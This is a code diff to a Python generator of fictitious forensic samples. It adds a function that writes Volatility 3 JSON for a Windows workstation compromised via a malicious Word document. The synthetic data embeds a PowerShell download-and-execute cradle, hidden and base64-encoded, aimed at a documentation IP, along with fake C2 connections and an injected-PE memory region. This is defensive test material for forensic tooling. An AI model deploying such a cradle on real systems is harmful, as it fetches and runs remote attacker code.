@@ -3,7 +3,7 @@
 
 All data is fictitious: IPs come from RFC 5737 documentation ranges, domains use
 reserved ``.example``-style names. Formats match what nix-forensics tools emit:
-``evtx_dump -o jsonl``, Linux auth.log, mactime bodyfile and Zeek TSV logs.
+``evtx_dump -o jsonl``, Linux auth.log, mactime bodyfile, Zeek TSV logs and Volatility 3 JSON.
 
     python samples/generate.py          # rewrites samples/*/
 """
@@ -514,9 +514,140 @@ def benign_admin_day() -> None:
     write_jsonl(out / "Security.jsonl", recs)
 
 
+def windows_memory_phishing() -> None:
+    """Volatility 3 output of a workstation compromised by a malicious Word document.
+
+    WINWORD.EXE starts an encoded PowerShell download cradle, the payload runs as a fake svchost.exe
+    from the user's Temp folder, keeps a C2 connection, and injects a PE into explorer.exe.
+    Noise: a legitimate Chrome JIT region (RWX without MZ header) and normal system processes.
+    Files match ``vol -r json -f memory.raw windows.<plugin>``.
+    """
+    out = ROOT / "win-memory-phishing"
+    out.mkdir(exist_ok=True)
+    t0 = datetime(2026, 10, 20, 7, 58, 12, tzinfo=UTC)
+
+    def iso(delta: timedelta) -> str:
+        return (t0 + delta).isoformat()
+
+    procs = [  # pid, ppid, name, start offset, session
+        (4, 0, "System", timedelta(0), None),
+        (312, 4, "smss.exe", timedelta(seconds=1), None),
+        (428, 420, "csrss.exe", timedelta(seconds=3), 0),
+        (504, 420, "wininit.exe", timedelta(seconds=3), 0),
+        (560, 492, "winlogon.exe", timedelta(seconds=4), 1),
+        (640, 504, "services.exe", timedelta(seconds=4), 0),
+        (652, 504, "lsass.exe", timedelta(seconds=4), 0),
+        (788, 640, "svchost.exe", timedelta(seconds=6), 0),
+        (860, 640, "svchost.exe", timedelta(seconds=6), 0),
+        (1024, 640, "svchost.exe", timedelta(seconds=7), 0),
+        (2164, 2140, "explorer.exe", timedelta(minutes=1, seconds=30), 1),
+        (3020, 2164, "OneDrive.exe", timedelta(minutes=1, seconds=45), 1),
+        (3100, 2164, "chrome.exe", timedelta(minutes=12), 1),
+        (3412, 2164, "WINWORD.EXE", timedelta(hours=1, minutes=44, seconds=3), 1),
+        (4720, 3412, "powershell.exe", timedelta(hours=1, minutes=44, seconds=41), 1),
+        (5120, 4720, "svchost.exe", timedelta(hours=1, minutes=45, seconds=20), 1),
+    ]
+    pslist = [
+        {
+            "CreateTime": iso(start),
+            "ExitTime": None,
+            "File output": "Disabled",
+            "Handles": None,
+            "ImageFileName": name,
+            "Offset(V)": 0xFFFF8A0F00000000 + pid * 0x100,
+            "PID": pid,
+            "PPID": ppid,
+            "SessionId": session,
+            "Threads": 4 + pid % 23,
+            "Wow64": False,
+            "__children": [],
+        }
+        for pid, ppid, name, start, session in procs
+    ]
+
+    stage = "http://198.51.100.23/stage2.ps1"
+    cradle = f"IEX (New-Object Net.WebClient).DownloadString('{stage}')"
+    encoded = base64.b64encode(cradle.encode("utf-16-le")).decode()
+    args = {
+        4: None,
+        312: "\\SystemRoot\\System32\\smss.exe",
+        428: "%SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,20480,768",
+        504: "wininit.exe",
+        560: "winlogon.exe",
+        640: "C:\\Windows\\system32\\services.exe",
+        652: "C:\\Windows\\system32\\lsass.exe",
+        788: "C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p",
+        860: "C:\\Windows\\system32\\svchost.exe -k RPCSS -p",
+        1024: "C:\\Windows\\system32\\svchost.exe -k netsvcs -p",
+        2164: "C:\\Windows\\Explorer.EXE",
+        3020: '"C:\\Users\\l.bernard\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe" /background',
+        3100: '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"',
+        3412: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n '
+        '"C:\\Users\\l.bernard\\Downloads\\Facture_2026-10.docm"',
+        4720: f"powershell.exe -nop -w hidden -enc {encoded}",
+        5120: "C:\\Users\\l.bernard\\AppData\\Local\\Temp\\svchost.exe -k netsvcs",
+    }
+    names = {pid: name for pid, _, name, _, _ in procs}
+    cmdline = [{"Args": a, "PID": pid, "Process": names[pid], "__children": []} for pid, a in args.items()]
+
+    def conn(pid, local, lport, remote, rport, state, created):
+        return {
+            "Created": iso(created) if created else None,
+            "ForeignAddr": remote,
+            "ForeignPort": rport,
+            "LocalAddr": local,
+            "LocalPort": lport,
+            "Offset": 0xC5000000 + lport,
+            "Owner": names[pid],
+            "PID": pid,
+            "Proto": "TCPv4",
+            "State": state,
+            "__children": [],
+        }
+
+    me = "10.30.2.41"
+    netscan = [
+        conn(788, "0.0.0.0", 135, "0.0.0.0", 0, "LISTENING", timedelta(seconds=6)),
+        conn(652, "0.0.0.0", 49664, "0.0.0.0", 0, "LISTENING", timedelta(seconds=5)),
+        conn(1024, me, 50112, "10.30.0.10", 445, "ESTABLISHED", timedelta(minutes=2)),
+        conn(3020, me, 50340, "203.0.113.80", 443, "ESTABLISHED", timedelta(minutes=2)),
+        conn(3100, me, 51022, "203.0.113.15", 443, "ESTABLISHED", timedelta(minutes=58)),
+        conn(4720, me, 51877, "198.51.100.23", 80, "CLOSED", timedelta(hours=1, minutes=44, seconds=43)),
+        conn(
+            5120, me, 51890, "198.51.100.23", 8443, "ESTABLISHED", timedelta(hours=1, minutes=45, seconds=25)
+        ),
+        conn(4720, me, 51902, "198.51.100.23", 443, "ESTABLISHED", timedelta(hours=1, minutes=46, seconds=2)),
+    ]
+
+    def region(pid, start, hexdump):
+        return {
+            "CommitCharge": 16,
+            "Disasm": "",
+            "End VPN": start + 0xFFFF,
+            "File output": "Disabled",
+            "Hexdump": hexdump,
+            "Notes": None,
+            "PID": pid,
+            "PrivateMemory": 1,
+            "Process": names[pid],
+            "Protection": "PAGE_EXECUTE_READWRITE",
+            "Start VPN": start,
+            "Tag": "VadS",
+            "__children": [],
+        }
+
+    mz = "4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00"
+    jit = "49 8b c4 48 89 58 08 48 89 68 10 48 89 70 18 57 48 83 ec 20 48 8b f2 48 8b e9 33 ff 8b df 85 d2"
+    malfind = [region(3100, 0x2A4F0000, jit), region(2164, 0x7FF6A0000, mz)]
+
+    for name, rows in (("pslist", pslist), ("cmdline", cmdline), ("netscan", netscan), ("malfind", malfind)):
+        (out / f"windows.{name}.json").write_text("\n" + json.dumps(rows, indent=2, sort_keys=True) + "\n")
+
+
 if __name__ == "__main__":
     windows_rdp_intrusion()
     linux_ssh_compromise()
     network_c2_exfil()
     benign_admin_day()
+    windows_memory_phishing()
     print("samples regenerated in", ROOT)
